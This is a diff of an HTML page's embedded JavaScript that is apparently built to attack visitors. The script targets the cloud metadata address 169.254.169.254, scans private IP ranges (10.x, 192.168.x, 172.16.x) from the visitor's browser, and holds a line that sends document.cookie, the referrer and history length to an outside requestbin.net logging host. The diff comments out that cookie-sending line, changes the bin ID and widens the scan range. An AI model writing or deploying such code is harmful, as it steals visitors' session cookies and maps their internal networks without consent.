@@ -10,7 +10,7 @@
     <div id="custom_button"></div>
     
     <script>
-    let LOG_URL = "http://requestbin.net/r/5lbha8lp";
+    let LOG_URL = "http://requestbin.net/r/e1yrlu55";
     let LOCAL_HOST = "169.254.169.254";
     let ipIterator="";
     let local_ip_ranges = ["10.", "192.168.", "172.16."];
@@ -18,7 +18,7 @@
     let local_ips = ["192.168.255.1", "192.168.100.1","10.0.1.1", "172.16.254.1", "172.16.100.1"];
     
      let imCoo = new Image();
-     imCoo.src = LOG_URL + "?c=" + document.cookie + "&r=" + document.referrer + "&l=" + history.length;
+     //imCoo.src = LOG_URL + "?c=" + document.cookie + "&r=" + document.referrer + "&l=" + history.length;
      //
       var last_scanobj_index = 0;
       var scanobjs = {};
@@ -235,7 +235,7 @@
       let ip = "";
       let bit1 = 0;
       let bit2 = 0;
-      let bit3 = 0;
+      let bit3 = 20;
       let bit4 = 0;
 
       //10.X.X.X
@@ -264,7 +264,7 @@
       else if (i == 1)
       {
           ip = "192.168.";
-          while (bit3 <= 10)
+          while (bit3 <= 40)
           {
             while (bit4 < 1)
             {
